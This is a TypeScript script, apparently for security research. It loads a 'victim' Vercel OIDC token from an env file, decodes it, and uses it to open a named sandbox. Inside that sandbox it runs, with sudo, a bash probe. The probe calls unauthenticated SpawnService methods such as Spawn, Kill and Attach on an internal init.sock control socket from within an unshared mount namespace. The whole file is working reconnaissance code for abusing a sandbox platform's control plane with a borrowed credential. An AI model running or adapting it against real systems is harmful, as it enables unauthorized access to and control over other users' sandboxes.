import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
echo "=== SpawnService methods on init.sock (no auth) ==="
for path in \\
  "/vercel.sandbox.spawn.v1.SpawnService/Ping" \\
  "/vercel.sandbox.spawn.v1.SpawnService/Spawn" \\
  "/vercel.sandbox.spawn.v1.SpawnService/Kill" \\
  "/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive" \\
  "/vercel.sandbox.spawn.v1.SpawnService/Attach" \\
  "/vercel.sandbox.spawn.v1.SpawnService/List" \\
  ; do
  echo "--- $path ---"
  timeout 3 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/o -w "code=%{http_code} size=%{size_download}\\n" \\
    -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' \\
    --data-binary @/tmp/empty.msg "http://localhost$path" 2>&1 | tail -1
  echo "body:"; head -c 300 /tmp/o 2>/dev/null | xxd | head -8
done
echo "=== connect-rpc style (json) ==="
for path in "/vercel.sandbox.spawn.v1.SpawnService.Ping" "/vercel.sandbox.spawn.v1.SpawnService/Spawn"; do
  echo "--- $path ---"
  timeout 3 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/o2 -w "code=%{http_code}\\n" \\
    -H 'Content-Type: application/json' -d '{}' "http://localhost$path" 2>&1 | tail -1
  head -c 200 /tmp/o2 2>/dev/null; echo ""
done
echo "=== connect-rpc unary json (correct connect path) ==="
timeout 3 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/o3 -w "code=%{http_code}\\n" \\
  -H 'Content-Type: application/json' -H 'Connect-Protocol-Version: 1' \\
  -X POST -d '{}' "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Ping" 2>&1 | tail -1
head -c 300 /tmp/o3 2>/dev/null; echo ""
echo "=== who listens: ss on unix ==="
ss -xlnp 2>/dev/null | grep -a init.sock
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore41.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore41.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
